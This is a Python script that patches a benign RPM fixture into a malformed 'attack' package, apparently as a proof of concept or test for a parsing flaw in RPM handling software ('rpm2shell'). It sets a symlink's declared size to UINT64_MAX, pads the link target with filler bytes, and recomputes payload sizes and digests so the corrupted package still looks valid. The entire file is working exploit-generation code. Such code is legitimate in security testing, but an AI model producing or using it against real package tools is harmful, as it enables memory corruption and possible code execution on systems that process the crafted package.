#!/usr/bin/env python3
"""Patch the safe rpm2shell fixture's symlink size to UINT64_MAX."""
import hashlib
from pathlib import Path
import stat
import struct
import sys


def pad4(value: bytes) -> bytes:
    return value + b"\0" * ((-len(value)) & 3)


def newc_entry(name: str, mode: int, data: bytes, inode: int) -> bytes:
    fields = [inode, mode, 0, 0, 1, 1234567890, len(data), 0, 0, 0, 0,
              len(name) + 1, 0]
    header = b"070701" + b"".join(f"{value:08x}".encode() for value in fields)
    return pad4(header + name.encode() + b"\0") + pad4(data)


def newc_payload(link_data: bytes = b"MISHE-RPM!!") -> bytes:
    entries = [
        ("./opt/README", 0o100644, b"some text\n"),
        ("./opt/linkme", 0o120777, link_data),
        ("./opt/mydir", 0o040755, b""),
        ("./opt/myscript.sh", 0o100755, b"#!/bin/sh\necho some script\n"),
    ]
    payload = b"".join(newc_entry(name, mode, data, i + 1)
                       for i, (name, mode, data) in enumerate(entries))
    return payload + newc_entry("TRAILER!!!", 0, b"", 0)

MAGIC = b"\x8e\xad\xe8\x01"
REGION_TAG = 62
IMMUTABLE_TAG = 63
TYPE_INT16 = 3
TYPE_INT32 = 4
TYPE_INT64 = 5
TYPE_STRING = 6
TYPE_STRING_ARRAY = 8


def header_at(blob: bytes, offset: int):
    if blob[offset:offset + 4] != MAGIC:
        raise ValueError(f"no RPM header at {offset:#x}")
    count, size = struct.unpack_from(">II", blob, offset + 8)
    index = offset + 16
    data = index + count * 16
    entries = {
        tag: (kind, rel, n)
        for tag, kind, rel, n in (
            struct.unpack_from(">IIiI", blob, index + i * 16)
            for i in range(count)
        )
    }
    return entries, data, size, data + size


def string_at(blob: bytes, start: int, end: int):
    nul = blob.index(0, start, end)
    return blob[start:nul].decode("ascii")


def strings_at(blob: bytes, start: int, end: int, count: int):
    values = []
    for _ in range(count):
        value = string_at(blob, start, end)
        values.append(value)
        start += len(value) + 1
    return values


def cpio_entry(blob: bytes, offset: int, file_sizes):
    magic = blob[offset:offset + 6]
    if magic == b"07070X":
        file_index = int(blob[offset + 6:offset + 14], 16)
        if file_index == 0xFFFFFFFF:
            return "TRAILER!!!", 0, offset + 14, offset + 14, (offset + 17) & ~3
        if file_index >= len(file_sizes):
            raise ValueError(f"stripped cpio index {file_index} out of range")
        file_size = file_sizes[file_index]
        data_start = (offset + 17) & ~3
        data_end = data_start + file_size
        return f"#{file_index}", file_size, data_start, data_end, (data_end + 3) & ~3
    if magic not in (b"070701", b"070702"):
        raise ValueError(f"no supported cpio header at {offset:#x}")
    fields = [int(blob[offset + 6 + i * 8:offset + 14 + i * 8], 16)
              for i in range(13)]
    file_size = fields[6]
    name_size = fields[11]
    name_start = offset + 110
    name = string_at(blob, name_start, name_start + name_size)
    data_start = (name_start + name_size + 3) & ~3
    data_end = data_start + file_size
    return name, file_size, data_start, data_end, (data_end + 3) & ~3


def main() -> int:
    if len(sys.argv) not in (3, 4, 5):
        print(f"usage: {sys.argv[0]} SAFE.rpm ATTACK.rpm "
              "[SAFE_NEWC.rpm [STRIPPED_ATTACK.rpm]]", file=sys.stderr)
        return 2
    source = Path(sys.argv[1])
    target = Path(sys.argv[2])
    blob = bytearray(source.read_bytes())

    sig_entries, _, _, sig_end = header_at(blob, 96)
    if REGION_TAG not in sig_entries:
        raise ValueError("signature region tag missing")
    main_at = (sig_end + 7) & ~7
    entries, data, data_size, payload_at = header_at(blob, main_at)
    if IMMUTABLE_TAG not in entries:
        raise ValueError("main immutable region tag missing")

    mode_type, mode_off, mode_count = entries[1030]  # RPMTAG_FILEMODES
    if mode_type != TYPE_INT16:
        raise ValueError("unexpected FILEMODES type")
    modes = struct.unpack_from(f">{mode_count}h", blob, data + mode_off)
    link_indices = [i for i, mode in enumerate(modes) if stat.S_ISLNK(mode & 0xFFFF)]
    if len(link_indices) != 1:
        raise ValueError(f"expected one symlink, found {len(link_indices)}")
    link_index = link_indices[0]

    size_type, size_off, size_count = entries[5008]  # RPMTAG_LONGFILESIZES
    if size_type != TYPE_INT64 or size_count != mode_count:
        raise ValueError("unexpected LONGFILESIZES shape")
    size_at = data + size_off + link_index * 8
    sizes = struct.unpack_from(f">{size_count}q", blob, data + size_off)
    old_size = sizes[link_index]
    if old_size != 11:
        raise ValueError(f"expected safe symlink size 11, found {old_size}")

    link_type, link_off, link_count = entries[1036]  # RPMTAG_FILELINKTOS
    if link_type != TYPE_STRING_ARRAY or link_count != mode_count:
        raise ValueError("unexpected FILELINKTOS shape")
    links = strings_at(blob, data + link_off, data + data_size, link_count)
    if links[link_index] != "MISHE-RPM!!":
        raise ValueError(f"unexpected symlink target {links[link_index]!r}")

    offset = payload_at
    seen_link = False
    while True:
        name, file_size, data_start, data_end, next_entry = cpio_entry(blob, offset, sizes)
        if name == "TRAILER!!!":
            break
        if name in ("./opt/linkme", f"#{link_index}"):
            if file_size != old_size:
                raise ValueError(f"cpio symlink size {file_size} != {old_size}")
            if blob[data_start:data_end] != b"MISHE-RPM!!":
                raise ValueError("controlled cpio payload missing")
            seen_link = True
        offset = next_entry
    if not seen_link:
        raise ValueError("symlink cpio entry missing")
    if len(sys.argv) == 5:
        stripped = bytearray(blob)
        struct.pack_into(">Q", stripped, size_at, 0xFFFFFFFFFFFFFFFF)
        Path(sys.argv[4]).write_bytes(stripped)

    def refresh(payload: bytes):
        nonlocal blob
        for tag in (5112, 5113):  # RPMTAG_PAYLOADSIZE, RPMTAG_PAYLOADSIZEALT
            kind, off, count = entries[tag]
            if kind != TYPE_INT64 or count != 1:
                raise ValueError(f"unexpected payload size tag {tag}")
            struct.pack_into(">Q", blob, data + off, len(payload))
        for tag, digest in (
            (5092, hashlib.sha256(payload).hexdigest()),
            (5097, hashlib.sha256(payload).hexdigest()),
            (5121, hashlib.sha512(payload).hexdigest()),
            (5122, hashlib.sha512(payload).hexdigest()),
            (5123, hashlib.sha3_256(payload).hexdigest()),
            (5124, hashlib.sha3_256(payload).hexdigest()),
        ):
            kind, off, count = entries[tag]
            old = string_at(blob, data + off, data + data_size)
            if kind not in (TYPE_STRING, TYPE_STRING_ARRAY) or count != 1:
                raise ValueError(f"unexpected payload digest tag {tag}")
            if len(old) != len(digest):
                raise ValueError(f"payload digest length changed for tag {tag}")
            blob[data + off:data + off + len(digest)] = digest.encode()
        blob = blob[:payload_at] + payload

    safe_payload = newc_payload()
    refresh(safe_payload)
    if len(sys.argv) == 4:
        Path(sys.argv[3]).write_bytes(blob)

    payload = newc_payload(b"MISHE-RPM!!" + b"A" * 53)
    refresh(payload)
    struct.pack_into(">Q", blob, size_at, 0xFFFFFFFFFFFFFFFF)
    target.write_bytes(blob)
    print(f"symlink_index={link_index} size_offset={size_at:#x} "
          f"payload_offset={payload_at:#x} old_size={old_size} "
          f"new_size=UINT64_MAX safe_newc_payload={len(safe_payload)} "
          f"attack_newc_payload={len(payload)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
